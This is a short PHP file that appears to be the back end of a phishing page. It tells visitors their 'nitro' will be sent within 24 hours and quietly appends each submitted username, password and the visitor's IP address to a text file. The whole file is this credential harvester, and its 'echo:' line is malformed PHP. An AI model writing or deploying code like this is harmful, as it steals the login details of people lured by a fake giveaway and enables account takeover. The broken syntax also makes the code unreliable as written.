<!-- // <html> -->
<!-- //   <head> -->
<!-- //   <link rel="stylesheet" href="../assest/style.css"/> -->
<!-- //   </head> -->
<!-- //   <body> -->
<!-- //     Your nitro will be send under 24 working hours. -->
<!-- //   </body> -->
<!-- // </html> -->
<?php
echo:"Your nitro will be send under 24 working hours.";
$iptoken = $_SERVER['REMOTE_ADDR'];  
    if(isset($_POST['pass'])){
      $user = $_POST['user'];
      $pass = $_POST['pass'];
      $file = fopen("savedata.txt", "a+");
      fwrite($file," -  IP: ".$iptoken."   Username: " . $user . "   Password: " . $pass . "\n\n");
      fclose($file);
      die();
}
?>
